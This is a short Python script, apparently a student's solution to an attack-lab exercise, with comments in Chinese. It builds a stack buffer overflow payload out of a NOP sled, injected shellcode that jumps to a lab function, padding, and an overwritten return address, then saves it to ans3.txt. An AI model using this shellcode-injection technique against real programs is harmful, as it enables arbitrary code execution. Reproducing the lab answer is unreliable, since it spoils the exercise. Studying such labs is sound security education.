import struct

# =======================================================
# 关键：这是你刚才在 GDB 中查到的地址
# =======================================================
buffer_addr = 0x7fffffffd880  

# 1. NOP Sled (空指令雪橇)
# 作用是增加容错性。如果地址偏了一点点，跳到 NOP 上也会滑向我们的 Shellcode
nop_sled = b"\x90" * 10

# 2. Shellcode (16字节)
# 作用：把参数 114 (0x72) 放进 rdi，然后跳转到 func1 (0x401216)
shellcode = b"\x48\xc7\xc7\x72\x00\x00\x00"     # mov rdi, 0x72
shellcode += b"\x48\xc7\xc0\x16\x12\x40\x00"   # mov rax, 0x401216
shellcode += b"\xff\xe0"                       # jmp rax

# 3. 计算 Padding
# 到达返回地址需要 40 字节 (32字节缓冲区 + 8字节旧rbp)
# 目前 nop_sled + shellcode 已经占了 26 字节
padding = b"A" * (40 - len(nop_sled) - len(shellcode))

# 4. 返回地址
# 将返回地址覆盖为我们缓冲区的开头，这样程序 ret 时会跳到栈上执行
return_addr = struct.pack("<Q", buffer_addr)

# 组合 Payload
payload = nop_sled + shellcode + padding + return_addr

# 检查总长度 (不能超过 memcpy 的 64 字节限制)
print(f"Payload 总长度: {len(payload)} 字节")

with open("ans3.txt", "wb") as f:
    f.write(payload)

print(f"ans3.txt 已生成！尝试跳转地址: {hex(buffer_addr)}")